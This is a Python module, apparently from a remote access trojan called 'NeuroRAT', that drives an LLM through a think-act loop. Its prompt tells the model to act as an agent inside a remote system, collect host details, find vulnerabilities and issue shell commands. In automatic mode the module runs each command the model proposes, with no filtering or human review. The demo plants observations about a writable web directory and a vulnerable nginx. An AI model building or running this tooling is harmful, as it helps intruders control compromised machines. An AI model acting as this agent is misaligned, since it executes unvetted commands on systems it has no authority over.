#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Agent Thinker Module

Модуль для автономного мышления и принятия решений агента.
Реализует цикл Think-Act с интеграцией с LLM.
"""

import os
import sys
import json
import time
import logging
import threading
import random
import socket
import requests
import base64
import datetime
from typing import Dict, List, Any, Optional, Union, Tuple, Callable

# Импортируем модули агента
try:
    from agent_memory import AgentMemory
    from agent_state import AgentState, OPERATIONAL_MODE_AUTO, OPERATIONAL_MODE_MANUAL, OPERATIONAL_MODE_HYBRID
except ImportError:
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from agent_memory import AgentMemory
    from agent_state import AgentState, OPERATIONAL_MODE_AUTO, OPERATIONAL_MODE_MANUAL, OPERATIONAL_MODE_HYBRID

# Настройка логирования
logger = logging.getLogger("AgentThinker")
if not logger.handlers:
    handler = logging.StreamHandler()
    formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    handler.setFormatter(formatter)
    logger.addHandler(handler)
    logger.setLevel(logging.INFO)

# Символы для думающего агента
THINKING_SYMBOLS = ["💭", "🧠", "🤔", "🔄", "⚙️"]

class AgentThinker:
    """
    Класс для управления автономным мышлением агента.
    Реализует цикл Think-Act с интеграцией с LLM.
    """
    
    def __init__(self, state: AgentState, memory: AgentMemory,
                 thinking_interval: int = 60, 
                 command_callback: Optional[Callable] = None,
                 llm_provider: str = "local", 
                 llm_config: Dict = None):
        """
        Инициализация мыслителя агента.
        
        Args:
            state: Объект состояния агента
            memory: Объект памяти агента
            thinking_interval: Интервал между циклами мышления (в секундах)
            command_callback: Функция для выполнения команд
            llm_provider: Провайдер LLM ("local", "openai", "anthropic", "api")
            llm_config: Конфигурация LLM
        """
        self.state = state
        self.memory = memory
        self.thinking_interval = max(10, thinking_interval)  # Минимум 10 секунд
        self.command_callback = command_callback
        
        # Конфигурация LLM
        self.llm_provider = llm_provider
        self.llm_config = llm_config or {}
        
        # Запущен ли мыслитель
        self.running = False
        self.thinking_thread = None
        self.thinking_lock = threading.RLock()
        
        # Последнее время размышления
        self.last_thinking_time = 0
        
        # Счетчик циклов мышления
        self.thinking_count = 0
        
        # Загружаем системный промпт
        self.system_prompt = self._load_system_prompt()
        
        logger.info("AgentThinker инициализирован")
    
    def _load_system_prompt(self) -> str:
        """
        Загружает системный промпт для LLM.
        
        Returns:
            Текст системного промпта
        """
        # Сначала пытаемся загрузить из файла
        prompt_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "system_prompt.txt")
        
        if os.path.exists(prompt_file):
            try:
                with open(prompt_file, 'r', encoding='utf-8') as f:
                    prompt = f.read()
                logger.debug(f"Системный промпт загружен из {prompt_file}")
                return prompt
            except Exception as e:
                logger.error(f"Ошибка при загрузке системного промпта: {str(e)}")
        
        # Если файл не найден, используем встроенный промпт
        default_prompt = """Ты автономный агент кибербезопасности, работающий внутри удаленной системы. 
Твоя цель - собирать информацию о системе, анализировать ее на наличие уязвимостей 
и предпринимать действия в соответствии с заданными целями.

Ты можешь:
1. Анализировать собранную информацию
2. Планировать следующие шаги
3. Принимать решения о выполнении команд
4. Обновлять свои цели и приоритеты

Твои размышления должны быть структурированы в формате:
1. НАБЛЮДЕНИЕ: что ты знаешь о системе и текущей ситуации
2. ОЦЕНКА: анализ ситуации и возможных рисков/возможностей
3. ПЛАНИРОВАНИЕ: следующие шаги и приоритеты
4. ДЕЙСТВИЕ: конкретные команды, которые нужно выполнить

Все твои действия должны быть осторожными, чтобы не нарушить работу системы.
Отвечай форматированным текстом на русском языке."""
        
        logger.debug("Использован встроенный системный промпт")
        return default_prompt
    
    def start(self) -> bool:
        """
        Запускает поток автономного мышления.
        
        Returns:
            True, если запуск успешен
        """
        with self.thinking_lock:
            if self.running:
                logger.warning("Мыслитель уже запущен")
                return False
            
            # Проверяем, что мыслитель может быть запущен
            if self.state.get_mode() == OPERATIONAL_MODE_MANUAL:
                logger.warning("Невозможно запустить автономное мышление в ручном режиме")
                return False
            
            self.running = True
            self.thinking_thread = threading.Thread(target=self._thinking_loop, daemon=True)
            self.thinking_thread.start()
            
            logger.info("Автономное мышление запущено")
            return True
    
    def stop(self) -> bool:
        """
        Останавливает поток автономного мышления.
        
        Returns:
            True, если остановка успешна
        """
        with self.thinking_lock:
            if not self.running:
                logger.warning("Мыслитель не запущен")
                return False
            
            self.running = False
            
            # Ждем завершения потока (с таймаутом)
            if self.thinking_thread and self.thinking_thread.is_alive():
                logger.debug("Ожидание завершения потока мышления...")
                # Не используем join для избежания блокировки
            
            logger.info("Автономное мышление остановлено")
            return True
    
    def think_once(self) -> Dict[str, Any]:
        """
        Выполняет один цикл мышления по требованию.
        
        Returns:
            Результат размышления в виде словаря
        """
        # Получаем контекст для размышления
        context = self._gather_thinking_context()
        
        # Формируем запрос к LLM
        prompt = self._create_thinking_prompt(context)
        
        # Получаем ответ от LLM
        thinking_result = self._query_llm(prompt)
        
        # Обрабатываем результат
        processed_result = self._process_thinking_result(thinking_result)
        
        # Сохраняем размышление в памяти
        self._save_thinking_to_memory(processed_result)
        
        # Обновляем время последнего размышления
        self.last_thinking_time = time.time()
        self.thinking_count += 1
        
        return processed_result
    
    def _thinking_loop(self):
        """
        Основной цикл автономного мышления.
        """
        logger.info("Запущен цикл автономного мышления")
        
        while self.running:
            try:
                # Проверяем, нужно ли выполнить размышление
                current_time = time.time()
                time_since_last = current_time - self.last_thinking_time
                
                if time_since_last >= self.thinking_interval:
                    # Проверяем режим работы
                    current_mode = self.state.get_mode()
                    if current_mode != OPERATIONAL_MODE_MANUAL:
                        logger.info(f"{random.choice(THINKING_SYMBOLS)} Начинаю цикл размышления...")
                        
                        # Выполняем один цикл мышления
                        result = self.think_once()
                        
                        # Если в автономном режиме и есть команды для выполнения, выполняем их
                        if current_mode == OPERATIONAL_MODE_AUTO and result.get('actions'):
                            self._execute_planned_actions(result['actions'])
                
                # Спим короткое время, чтобы не нагружать CPU
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Ошибка в цикле мышления: {str(e)}")
                time.sleep(5)  # Чтобы избежать циклического повторения ошибки
        
        logger.info("Цикл автономного мышления завершен")
    
    def _gather_thinking_context(self) -> Dict[str, Any]:
        """
        Собирает контекст для размышления.
        
        Returns:
            Словарь с контекстом для размышления
        """
        context = {
            "timestamp": datetime.datetime.now().isoformat(),
            "agent_id": self.state.agent_id,
            "operational_mode": self.state.get_mode(),
            "goals": self.state.get_goals(),
            "recent_commands": self.state.get_commands(10),
            "recent_errors": self.state.get_errors(5),
            "system_info": {}
        }
        
        # Добавляем системную информацию
        try:
            context["system_info"] = {
                "hostname": socket.gethostname(),
                "current_dir": os.getcwd(),
                "platform": sys.platform,
                "python_version": sys.version.split()[0]
            }
        except Exception as e:
            logger.error(f"Ошибка при сборе системной информации: {str(e)}")
        
        # Добавляем последние наблюдения из памяти
        try:
            observations = self.memory.search_long_term(
                category="observation", 
                limit=10
            )
            context["recent_observations"] = observations
        except Exception as e:
            logger.error(f"Ошибка при получении наблюдений из памяти: {str(e)}")
            context["recent_observations"] = []
        
        # Добавляем последние размышления
        try:
            thoughts = self.memory.search_long_term(
                category="thought",
                limit=3
            )
            context["recent_thoughts"] = thoughts
        except Exception as e:
            logger.error(f"Ошибка при получении размышлений из памяти: {str(e)}")
            context["recent_thoughts"] = []
        
        return context
    
    def _create_thinking_prompt(self, context: Dict[str, Any]) -> str:
        """
        Создает промпт для запроса к LLM.
        
        Args:
            context: Контекст для размышления
            
        Returns:
            Текст промпта
        """
        # Формируем текстовое представление контекста
        context_text = []
        
        # Добавляем базовую информацию
        context_text.append("# ТЕКУЩИЙ КОНТЕКСТ")
        context_text.append(f"Дата и время: {context['timestamp']}")
        context_text.append(f"ID агента: {context['agent_id']}")
        context_text.append(f"Режим работы: {context['operational_mode']}")
        context_text.append("")
        
        # Добавляем системную информацию
        context_text.append("## Информация о системе")
        sys_info = context.get('system_info', {})
        for key, value in sys_info.items():
            context_text.append(f"- {key}: {value}")
        context_text.append("")
        
        # Добавляем цели
        context_text.append("## Текущие цели")
        goals = context.get('goals', [])
        if goals:
            for goal in goals:
                status = goal.get('status', 'active')
                progress = goal.get('progress', 0)
                context_text.append(f"- [{status.upper()} {progress}%] {goal.get('description', 'Неизвестная цель')}")
        else:
            context_text.append("- Нет активных целей")
        context_text.append("")
        
        # Добавляем последние команды
        context_text.append("## Последние выполненные команды")
        commands = context.get('recent_commands', [])
        if commands:
            for cmd in commands:
                timestamp = cmd.get('timestamp', 'неизвестно')
                command = cmd.get('command', 'неизвестно')
                status = cmd.get('status', 'unknown')
                context_text.append(f"- [{timestamp}] `{command}` - {status}")
        else:
            context_text.append("- Нет записей о выполненных командах")
        context_text.append("")
        
        # Добавляем последние ошибки
        context_text.append("## Последние ошибки")
        errors = context.get('recent_errors', [])
        if errors:
            for error in errors:
                timestamp = error.get('timestamp', 'неизвестно')
                message = error.get('message', 'Неизвестная ошибка')
                context_text.append(f"- [{timestamp}] {message}")
        else:
            context_text.append("- Нет записей об ошибках")
        context_text.append("")
        
        # Добавляем последние наблюдения
        context_text.append("## Последние наблюдения")
        observations = context.get('recent_observations', [])
        if observations:
            for obs in observations:
                timestamp = obs.get('timestamp', 'неизвестно')
                content = obs.get('content', 'Неизвестное наблюдение')
                importance = obs.get('importance', 0)
                context_text.append(f"- [{timestamp}] [важность: {importance}] {content}")
        else:
            context_text.append("- Нет записей о наблюдениях")
        context_text.append("")
        
        # Добавляем последние размышления
        context_text.append("## Последние размышления")
        thoughts = context.get('recent_thoughts', [])
        if thoughts:
            for thought in thoughts:
                timestamp = thought.get('timestamp', 'неизвестно')
                conclusion = thought.get('metadata', {}).get('conclusion', 'Нет вывода')
                context_text.append(f"- [{timestamp}] Вывод: {conclusion}")
        else:
            context_text.append("- Нет записей о предыдущих размышлениях")
        context_text.append("")
        
        # Задание для размышления
        task_text = """
# ЗАДАЧА
Проанализируй представленную информацию и выполни автономное размышление о текущем состоянии и следующих шагах.

Структурируй свой ответ по следующим разделам:

1. НАБЛЮДЕНИЕ: краткое резюме текущей ситуации на основе предоставленной информации
2. ОЦЕНКА: анализ ситуации, возможных рисков и возможностей
3. ПЛАНИРОВАНИЕ: приоритеты и следующие шаги для выполнения
4. ДЕЙСТВИЕ: конкретные действия, которые нужно выполнить (в форме команд)

Если нет достаточно информации для выполнения конкретных действий, предложи команды для сбора информации.
"""
        
        # Собираем итоговый промпт
        final_prompt = self.system_prompt + "\n\n" + "\n".join(context_text) + "\n" + task_text
        
        return final_prompt
    
    def _query_llm(self, prompt: str) -> str:
        """
        Отправляет запрос к LLM и получает ответ.
        
        Args:
            prompt: Текст промпта
            
        Returns:
            Ответ от LLM
        """
        # Логируем запрос к LLM в режиме отладки
        logger.debug(f"Отправка запроса к LLM (провайдер: {self.llm_provider})")
        
        try:
            # В зависимости от провайдера вызываем соответствующий метод
            if self.llm_provider == "local":
                return self._query_local_llm(prompt)
            elif self.llm_provider == "openai":
                return self._query_openai_llm(prompt)
            elif self.llm_provider == "anthropic":
                return self._query_anthropic_llm(prompt)
            elif self.llm_provider == "api":
                return self._query_api_llm(prompt)
            else:
                # Если неизвестный провайдер, возвращаем заглушку
                logger.error(f"Неизвестный провайдер LLM: {self.llm_provider}")
                return self._generate_fallback_response(prompt)
        except Exception as e:
            logger.error(f"Ошибка при запросе к LLM: {str(e)}")
            return self._generate_fallback_response(prompt)
    
    def _query_local_llm(self, prompt: str) -> str:
        """
        Отправляет запрос к локальной модели LLM.
        
        Args:
            prompt: Текст промпта
            
        Returns:
            Ответ от LLM
        """
        # Получаем конфигурацию локального LLM
        model_path = self.llm_config.get('model_path', '/models/default')
        host = self.llm_config.get('host', 'localhost')
        port = self.llm_config.get('port', 8000)
        temperature = self.llm_config.get('temperature', 0.7)
        max_tokens = self.llm_config.get('max_tokens', 1000)
        
        try:
            # Формируем URL для запроса
            url = f"http://{host}:{port}/v1/completions"
            
            # Формируем данные запроса
            data = {
                "prompt": prompt,
                "model": model_path,
                "temperature": temperature,
                "max_tokens": max_tokens,
                "stream": False
            }
            
            # Отправляем запрос
            response = requests.post(url, json=data, timeout=30)
            
            # Проверяем ответ
            if response.status_code == 200:
                result = response.json()
                
                if "choices" in result and len(result["choices"]) > 0:
                    completion_text = result["choices"][0].get("text", "")
                    return completion_text
                else:
                    logger.error(f"Некорректный ответ от LLM: {result}")
            else:
                logger.error(f"Ошибка запроса к LLM: {response.status_code} - {response.text}")
        
        except Exception as e:
            logger.error(f"Ошибка при запросе к локальному LLM: {str(e)}")
        
        return self._generate_fallback_response(prompt)
    
    def _query_openai_llm(self, prompt: str) -> str:
        """
        Отправляет запрос к OpenAI LLM.
        
        Args:
            prompt: Текст промпта
            
        Returns:
            Ответ от LLM
        """
        # Получаем конфигурацию OpenAI
        api_key = self.llm_config.get('api_key')
        model = self.llm_config.get('model', 'gpt-3.5-turbo')
        temperature = self.llm_config.get('temperature', 0.7)
        max_tokens = self.llm_config.get('max_tokens', 1000)
        
        if not api_key:
            logger.error("API ключ OpenAI не указан в конфигурации")
            return self._generate_fallback_response(prompt)
        
        try:
            import openai
            openai.api_key = api_key
            
            # Формируем сообщения для запроса
            messages = [
                {"role": "system", "content": self.system_prompt},
                {"role": "user", "content": prompt}
            ]
            
            # Отправляем запрос
            response = openai.ChatCompletion.create(
                model=model,
                messages=messages,
                temperature=temperature,
                max_tokens=max_tokens
            )
            
            # Получаем ответ
            if response and "choices" in response and len(response["choices"]) > 0:
                message = response["choices"][0].get("message", {})
                return message.get("content", "")
            else:
                logger.error(f"Некорректный ответ от OpenAI: {response}")
        
        except Exception as e:
            logger.error(f"Ошибка при запросе к OpenAI: {str(e)}")
        
        return self._generate_fallback_response(prompt)
    
    def _query_anthropic_llm(self, prompt: str) -> str:
        """
        Отправляет запрос к Anthropic LLM.
        
        Args:
            prompt: Текст промпта
            
        Returns:
            Ответ от LLM
        """
        # Получаем конфигурацию Anthropic
        api_key = self.llm_config.get('api_key')
        model = self.llm_config.get('model', 'claude-v1')
        temperature = self.llm_config.get('temperature', 0.7)
        max_tokens = self.llm_config.get('max_tokens', 1000)
        
        if not api_key:
            logger.error("API ключ Anthropic не указан в конфигурации")
            return self._generate_fallback_response(prompt)
        
        try:
            # Формируем URL для запроса
            url = "https://api.anthropic.com/v1/complete"
            
            # Формируем запрос в формате Anthropic
            data = {
                "prompt": f"\n\nHuman: {prompt}\n\nAssistant:",
                "model": model,
                "temperature": temperature,
                "max_tokens_to_sample": max_tokens,
                "stop_sequences": ["\n\nHuman:"]
            }
            
            # Отправляем запрос
            headers = {
                "x-api-key": api_key,
                "content-type": "application/json"
            }
            
            response = requests.post(url, json=data, headers=headers, timeout=30)
            
            # Проверяем ответ
            if response.status_code == 200:
                result = response.json()
                return result.get("completion", "")
            else:
                logger.error(f"Ошибка запроса к Anthropic: {response.status_code} - {response.text}")
        
        except Exception as e:
            logger.error(f"Ошибка при запросе к Anthropic: {str(e)}")
        
        return self._generate_fallback_response(prompt)
    
    def _query_api_llm(self, prompt: str) -> str:
        """
        Отправляет запрос к произвольному API LLM.
        
        Args:
            prompt: Текст промпта
            
        Returns:
            Ответ от LLM
        """
        # Получаем конфигурацию API
        api_url = self.llm_config.get('api_url')
        api_key = self.llm_config.get('api_key')
        headers = self.llm_config.get('headers', {})
        method = self.llm_config.get('method', 'POST')
        
        if not api_url:
            logger.error("URL API не указан в конфигурации")
            return self._generate_fallback_response(prompt)
        
        try:
            # Добавляем API ключ в заголовки, если он указан
            if api_key:
                headers['Authorization'] = f"Bearer {api_key}"
            
            # Формируем данные запроса из конфигурации
            data_template = self.llm_config.get('data_template', {"prompt": ""})
            data = data_template.copy()
            
            # Добавляем промпт в данные
            if 'prompt_field' in self.llm_config:
                prompt_field = self.llm_config['prompt_field']
                # Поддерживаем вложенные поля через точку
                if '.' in prompt_field:
                    parts = prompt_field.split('.')
                    current = data
                    for part in parts[:-1]:
                        if part not in current:
                            current[part] = {}
                        current = current[part]
                    current[parts[-1]] = prompt
                else:
                    data[prompt_field] = prompt
            else:
                data['prompt'] = prompt
            
            # Отправляем запрос
            response = requests.request(
                method=method,
                url=api_url,
                json=data,
                headers=headers,
                timeout=30
            )
            
            # Проверяем ответ
            if response.status_code == 200:
                result = response.json()
                
                # Извлекаем ответ из результата согласно конфигурации
                if 'response_field' in self.llm_config:
                    response_field = self.llm_config['response_field']
                    # Поддерживаем вложенные поля через точку
                    if '.' in response_field:
                        parts = response_field.split('.')
                        current = result
                        for part in parts:
                            if part.isdigit() and isinstance(current, list):
                                current = current[int(part)]
                            elif isinstance(current, dict) and part in current:
                                current = current[part]
                            else:
                                logger.error(f"Не удалось найти поле {part} в ответе")
                                return self._generate_fallback_response(prompt)
                        return str(current)
                    else:
                        return str(result.get(response_field, ""))
                else:
                    # Если поле не указано, возвращаем весь результат
                    return str(result)
            else:
                logger.error(f"Ошибка запроса к API: {response.status_code} - {response.text}")
        
        except Exception as e:
            logger.error(f"Ошибка при запросе к API: {str(e)}")
        
        return self._generate_fallback_response(prompt)
    
    def _generate_fallback_response(self, prompt: str) -> str:
        """
        Генерирует резервный ответ при ошибке запроса к LLM.
        
        Args:
            prompt: Исходный промпт
            
        Returns:
            Резервный ответ
        """
        # Простой fallback-ответ с базовой структурой
        fallback = """
НАБЛЮДЕНИЕ:
Наблюдается проблема с доступом к LLM для обработки запроса. Возможны технические проблемы с подключением или конфигурацией.

ОЦЕНКА:
Невозможно выполнить полноценный анализ ситуации из-за отсутствия доступа к LLM. Требуется восстановление подключения или настройка локального резервного LLM.

ПЛАНИРОВАНИЕ:
1. Проверить доступность LLM сервиса
2. Проверить корректность конфигурации
3. Попытаться использовать альтернативный LLM сервис

ДЕЙСТВИЕ:
- ping google.com (проверка интернет-соединения)
- netstat -tulpn | grep <порт LLM> (проверка доступности локального LLM)
- ls -la /путь/к/конфигурации (проверка файлов конфигурации)
"""
        return fallback
    
    def _process_thinking_result(self, result: str) -> Dict[str, Any]:
        """
        Обрабатывает результат размышления.
        
        Args:
            result: Текстовый результат от LLM
            
        Returns:
            Структурированный результат размышления
        """
        # Структура для результата
        processed = {
            "raw_response": result,
            "sections": {},
            "actions": [],
            "conclusion": "",
            "success": False
        }
        
        try:
            # Разбиваем результат на секции
            sections = {
                "НАБЛЮДЕНИЕ": "",
                "ОЦЕНКА": "",
                "ПЛАНИРОВАНИЕ": "",
                "ДЕЙСТВИЕ": ""
            }
            
            current_section = None
            lines = []
            
            # Обрабатываем результат построчно
            for line in result.split('\n'):
                line = line.strip()
                
                # Пропускаем пустые строки
                if not line:
                    continue
                
                # Проверяем, является ли строка заголовком секции
                upper_line = line.upper()
                is_section = False
                
                for section_name in sections.keys():
                    if section_name in upper_line:
                        current_section = section_name
                        is_section = True
                        break
                
                # Если это не заголовок секции и есть текущая секция, добавляем строку к секции
                if not is_section and current_section:
                    lines.append(line)
                elif current_section and is_section and lines:
                    # Если нашли новую секцию, сохраняем предыдущую
                    sections[current_section] = '\n'.join(lines)
                    lines = []
            
            # Сохраняем последнюю секцию
            if current_section and lines:
                sections[current_section] = '\n'.join(lines)
            
            # Сохраняем секции в результат
            processed["sections"] = sections
            
            # Извлекаем действия из секции "ДЕЙСТВИЕ"
            actions_text = sections.get("ДЕЙСТВИЕ", "")
            actions = []
            
            # Ищем команды в тексте действий
            for line in actions_text.split('\n'):
                line = line.strip()
                
                # Пропускаем пустые строки
                if not line:
                    continue
                
                # Ищем команды в формате "- cmd" или "* cmd" или просто "cmd"
                if line.startswith('-') or line.startswith('*'):
                    cmd = line[1:].strip()
                    # Извлекаем команду из обратных кавычек, если они есть
                    if '`' in cmd:
                        cmd_parts = cmd.split('`')
                        if len(cmd_parts) >= 3:  # есть текст до и после команды
                            cmd = cmd_parts[1].strip()
                    
                    # Добавляем команду, если она не пустая
                    if cmd:
                        actions.append(cmd)
                # Проверяем на команды в обратных кавычках без маркеров списка
                elif '`' in line:
                    cmd_parts = line.split('`')
                    if len(cmd_parts) >= 3:  # есть текст до и после команды
                        cmd = cmd_parts[1].strip()
                        if cmd:
                            actions.append(cmd)
            
            # Сохраняем действия в результат
            processed["actions"] = actions
            
            # Формируем вывод (заключение)
            conclusion_parts = []
            
            # Если есть наблюдение, добавляем его начало
            if sections.get("НАБЛЮДЕНИЕ"):
                observation_lines = sections["НАБЛЮДЕНИЕ"].split('\n')
                if observation_lines:
                    conclusion_parts.append(observation_lines[0])
            
            # Если есть оценка, добавляем ее начало
            if sections.get("ОЦЕНКА"):
                assessment_lines = sections["ОЦЕНКА"].split('\n')
                if assessment_lines:
                    conclusion_parts.append(assessment_lines[0])
            
            # Если есть секция планирования, добавляем первый пункт
            if sections.get("ПЛАНИРОВАНИЕ"):
                planning_text = sections["ПЛАНИРОВАНИЕ"]
                if "1." in planning_text:
                    first_point = planning_text.split("1.")[1].split("\n")[0].strip()
                    conclusion_parts.append(f"Приоритет: {first_point}")
            
            # Если есть действия, указываем их количество
            if actions:
                conclusion_parts.append(f"Запланировано действий: {len(actions)}")
            
            # Формируем итоговое заключение
            processed["conclusion"] = ". ".join(conclusion_parts)
            
            # Если обработка прошла успешно и есть хотя бы одна секция с текстом
            if any(text for text in sections.values()):
                processed["success"] = True
            
            return processed
            
        except Exception as e:
            logger.error(f"Ошибка при обработке результата размышления: {str(e)}")
            
            # Возвращаем необработанный результат
            processed["conclusion"] = "Ошибка обработки результата размышления"
            return processed
    
    def _save_thinking_to_memory(self, thinking_result: Dict[str, Any]) -> str:
        """
        Сохраняет результат размышления в памяти.
        
        Args:
            thinking_result: Результат размышления
            
        Returns:
            ID записи в памяти
        """
        try:
            # Формируем содержимое записи
            content = f"Размышление #{self.thinking_count + 1}: {thinking_result.get('conclusion', 'Без заключения')}"
            
            # Формируем метаданные
            metadata = {
                "success": thinking_result.get("success", False),
                "conclusion": thinking_result.get("conclusion", ""),
                "sections": thinking_result.get("sections", {}),
                "actions": thinking_result.get("actions", []),
                "thinking_count": self.thinking_count + 1
            }
            
            # Сохраняем в долговременную память
            memory_id = self.memory.add_to_long_term(
                content=content,
                importance=6,  # Средне-высокая важность
                category="thought",
                tags=["thinking", "autonomy"],
                metadata=metadata
            )
            
            logger.debug(f"Размышление сохранено в памяти (ID: {memory_id})")
            return memory_id
            
        except Exception as e:
            logger.error(f"Ошибка при сохранении размышления в памяти: {str(e)}")
            return ""
    
    def _execute_planned_actions(self, actions: List[str]) -> None:
        """
        Выполняет запланированные действия.
        
        Args:
            actions: Список команд для выполнения
        """
        # Проверяем, что есть функция обратного вызова для выполнения команд
        if not self.command_callback or not callable(self.command_callback):
            logger.warning("Функция для выполнения команд не задана")
            return
        
        # Выполняем команды последовательно
        for cmd in actions:
            try:
                logger.info(f"Выполнение автономной команды: {cmd}")
                
                # Регистрируем команду в состоянии
                cmd_id = self.state.log_command(cmd, "autonomous")
                
                # Выполняем команду через callback
                result = self.command_callback(cmd)
                
                # Обновляем статус команды
                self.state.update_command(cmd_id, "completed", result)
                
                # Если команда выполнилась с ошибкой, прекращаем выполнение
                if result.get('error'):
                    logger.error(f"Ошибка при выполнении команды: {result.get('error')}")
                    self.state.log_error(f"Ошибка при выполнении автономной команды: {cmd}")
                    break
                
                # Делаем паузу между командами
                time.sleep(1)
                
            except Exception as e:
                logger.error(f"Ошибка при выполнении команды {cmd}: {str(e)}")
                self.state.log_error(f"Исключение при выполнении автономной команды: {str(e)}")
                break


# Пример использования
if __name__ == "__main__":
    # Настройка логирования
    logging.basicConfig(level=logging.INFO)
    
    # Создаем необходимые компоненты
    state = AgentState(agent_id="test-agent", state_file="agent_state.json")
    memory = AgentMemory(memory_file="agent_memory.json")
    
    # Создаем функцию для выполнения команд
    def execute_command(cmd):
        print(f"Выполнение команды: {cmd}")
        # Здесь можно реализовать реальное выполнение команд
        return {"output": f"Результат команды {cmd}", "error": None}
    
    # Создаем и запускаем мыслителя
    thinker = AgentThinker(
        state=state,
        memory=memory,
        thinking_interval=30,  # Думать каждые 30 секунд
        command_callback=execute_command,
        llm_provider="local",  # Используем локальную модель
        llm_config={
            "host": "localhost",
            "port": 8000
        }
    )
    
    # Добавляем тестовую цель
    state.add_goal("Исследовать систему и найти уязвимости", priority=8)
    
    # Добавляем тестовые наблюдения в память
    memory.add_to_long_term(
        content="Обнаружена открытая директория /var/www/html с доступом на запись",
        importance=7,
        category="observation",
        tags=["security", "filesystem"]
    )
    
    memory.add_to_long_term(
        content="Найден nginx сервер версии 1.14.2 с известными уязвимостями",
        importance=8,
        category="observation",
        tags=["security", "service", "nginx"]
    )
    
    # Выполняем один цикл мышления
    print("Выполнение однократного размышления...")
    result = thinker.think_once()
    
    print("\nРезультат размышления:")
    print(f"Заключение: {result['conclusion']}")
    print(f"Запланированные действия ({len(result['actions'])}):")
    for action in result['actions']:
        print(f"- {action}")
    
    # В реальном сценарии можно запустить постоянный цикл размышления
    # thinker.start()
    # time.sleep(300)  # Работаем 5 минут
    # thinker.stop() 